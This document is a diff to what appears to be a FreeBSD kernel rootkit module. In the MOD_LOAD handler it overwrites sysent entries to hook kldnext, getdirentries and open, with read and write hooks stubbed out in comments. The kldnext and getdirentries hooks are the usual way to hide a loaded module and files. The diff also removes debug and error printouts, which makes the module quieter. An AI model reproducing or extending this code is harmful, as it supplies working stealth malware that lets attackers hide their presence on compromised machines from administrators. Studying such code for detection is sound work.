@@ -37,7 +37,6 @@ static int main(struct thread *td, void *syscall_args) {
 			unset_flag_bits(uap->args[0], (uint8_t)resp);
 			break;
 		default:
-			uprintf("Bad command\n");
 			break;
 	}
 
@@ -59,22 +58,19 @@ static int load(struct module *module, int cmd, void *arg) {
 
 	switch (cmd) {
 	case MOD_LOAD:
-		printf("system call loaded at offset %d.\n", offset);
-		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
-		printf("kldnext hooked\n");
-		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries_hook;
-		printf("getdirentries hooked\n");
-
-
-
+		sysent[SYS_kldnext].sy_call = (sy_call_t *)hook_sys_kldnext;
+		sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_sys_getdirentries;
+		sysent[SYS_open].sy_call = (sy_call_t *)hook_sys_open;
+		// sysent[SYS_read].sy_call = (sy_call_t *)hook_sys_read;
+		// sysent[SYS_write].sy_call = (sy_call_t *)hook_sys_write;
 		break;
 
 	case MOD_UNLOAD:
-		printf("system call unloaded from offset %d.\n", offset);
 		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
-		printf("kldnext unhooked\n");
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
-		printf("getdirentries unhooked\n");
+		sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
+		// sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
+		// sysent[SYS_write].sy_call = (sy_call_t *)sys_write;
 		break;
 
 	default:
